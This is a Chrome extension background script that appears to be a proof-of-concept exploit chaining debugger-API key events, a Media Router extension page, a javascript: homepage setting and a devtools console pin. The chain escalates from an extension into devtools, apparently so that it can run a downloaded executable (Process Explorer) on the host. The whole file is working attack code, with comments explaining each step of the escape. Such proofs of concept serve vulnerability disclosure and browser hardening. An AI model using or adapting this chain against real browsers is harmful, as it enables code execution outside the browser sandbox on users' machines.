const downloadUrl = "https://live.sysinternals.com/procexp.exe";

let targetTab = null;
let targetTabUpdateListener = null;

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (!targetTab || tabId !== targetTab.id  || changeInfo.status !== "complete" || !targetTabUpdateListener) {
        return;
    }

    targetTabUpdateListener(tab);
});

let runtimeMessageListener = null;

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (runtimeMessageListener) {
        runtimeMessageListener(message, sender, sendResponse);
    }
});

startProcess();

function startProcess() {
    chrome.tabs.create({url: downloadUrl});

    setTimeout(() => {
        onDownloadStarted();
    }, 1000);
}

function onDownloadStarted() {
    // It doesn't matter what site is used here. The only requirement is that the extension be able
    // to attach the debugger to it.
    chrome.tabs.create({url: "https://www.google.com/"}, function (tab) {
        targetTab = tab;
    });
    
    targetTabUpdateListener = function (tab) {
        targetTabUpdateListener = null;

        onInitialPageLoaded(tab);
    };
}

function onInitialPageLoaded(tab) {
    chrome.debugger.attach({tabId: tab.id}, "1.3", function () {
        onDebuggerAttachedToInitialPage(tab);
    });
}

function onDebuggerAttachedToInitialPage(tab) {
    // This will open the devtools. Note that in order for the browser to process this key event,
    // the event type needs to be rawKeyDown and nativeVirtualKeyCode needs to be set.
    chrome.debugger.sendCommand({tabId: tab.id}, "Input.dispatchKeyEvent",
        {type: "rawKeyDown", key: "F12", windowsVirtualKeyCode: 123, nativeVirtualKeyCode: 123});

    runtimeMessageListener = function (message, sender, sendResponse) {
        if (message == "devtools-page-loaded") {
            runtimeMessageListener = null;

            onDevtoolsPageLoaded(tab);
        }
    };
}

function onDevtoolsPageLoaded(tab) {
    // At the next step, the page being debugged will be navigated to a file in the Chrome Media
    // Router extension. As extensions can't debug other extensions, the debugger will be detached
    // at that point. However, the keyboard shortcut dispatched below (Alt+Home) requires the
    // debugger in order to be sent.
    // It's not necessary for a browser-level shortcut to be dispatched to the page, however.
    // Dispatching a shortcut to an opened devtools instance (or a frame contained within it) will
    // generally have the same effect.
    // Therefore, the extension will attach to the devtools panel that's created here. It's
    // necessary, however, that the panel be visible for the shortcut to be handled by the browser.
    // Attaching to devtools_page.html and dispatching the key event to it wouldn't be sufficient,
    // as the frame it's contained within is specifically not visible.
    chrome.runtime.sendMessage(undefined, "create-and-show-panel", undefined, function () {
        onDevtoolsPanelCreated(tab);
    });
}

function onDevtoolsPanelCreated(tab) {
    chrome.tabs.update(tab.id, {url: "chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_sender.js"});

    targetTabUpdateListener = function (tab) {
        targetTabUpdateListener = null;

        onNavigatedToMediaRouterPage(tab);
    };
}

function onNavigatedToMediaRouterPage(tab) {
    chrome.runtime.sendMessage(undefined, "update-homepage-setting", undefined, function () {
        onHomepageSettingUpdated(tab);
    });
}

function onHomepageSettingUpdated(tab) {
    chrome.tabs.update(tab.id, {url: "devtools://devtools/"});

    targetTabUpdateListener = function (tab) {
        targetTabUpdateListener = null;

        onDevtoolsMainPageLoaded(tab);
    };
}

function onDevtoolsMainPageLoaded(tab) {
    chrome.debugger.getTargets(function (targets) {
        let devtoolsPanelTarget = targets.find(function (target) {
            if (target.type === "other" && target.url === chrome.runtime.getURL("panel.html")) {
                return true;
            }

            return false;
        });

        if (!devtoolsPanelTarget) {
            return;
        }

        onDevtoolsPanelTargetFound(tab, devtoolsPanelTarget.id);
    });
}

function onDevtoolsPanelTargetFound(tab, devtoolsPanelTargetId) {
    chrome.debugger.attach({targetId: devtoolsPanelTargetId}, "1.3", function () {
        onDebuggerAttachedToDevtoolsPage(tab, devtoolsPanelTargetId);
    });
}

function onDebuggerAttachedToDevtoolsPage(tab, devtoolsPanelTargetId) {
    // Alt+Home is the keyboard shortcut to navigate to the homepage. The homepage will have been
    // set by devtools_page.js to a javascript: URL, which means that when this keyboard shortcut is
    // processed by the browser, the javascript: URL will be executed against the current tab.
    chrome.debugger.sendCommand({targetId: devtoolsPanelTargetId}, "Input.dispatchKeyEvent",
        {type: "rawKeyDown", modifiers: 1, key: "Home", windowsVirtualKeyCode: 36,
        nativeVirtualKeyCode: 36});

    runtimeMessageListener = function (message, sender, sendResponse) {
        if (message == "console-pin-added") {
            runtimeMessageListener = null;

            onConsolePinAdded(tab);
        }
    };
}

function onConsolePinAdded(tab) {
    chrome.tabs.update(tab.id, {url: "https://www.google.com/"});

    targetTabUpdateListener = function (tab) {
        targetTabUpdateListener = null;

        onNavigatedToDebuggablePage(tab);
    };
}

function onNavigatedToDebuggablePage(tab) {
    chrome.debugger.attach({tabId: tab.id}, "1.3", function () {
        onAttachedToDebuggablePage(tab);
    });
}

function onAttachedToDebuggablePage(tab) {
    // This will toggle (and therefore close) the devtools.
    chrome.debugger.sendCommand({tabId: tab.id}, "Input.dispatchKeyEvent",
        {type: "rawKeyDown", key: "F12", windowsVirtualKeyCode: 123, nativeVirtualKeyCode: 123});

    setTimeout(() => {
        // This will reopen the devtools (at which point, the console pin added above will run).
        chrome.debugger.sendCommand({tabId: tab.id}, "Input.dispatchKeyEvent",
            {type: "rawKeyDown", key: "F12", windowsVirtualKeyCode: 123, nativeVirtualKeyCode: 123});

        setTimeout(() => {
            chrome.tabs.update(tab.id, {url: "chrome://inspect/"});
        }, 1000);
    }, 1000);
}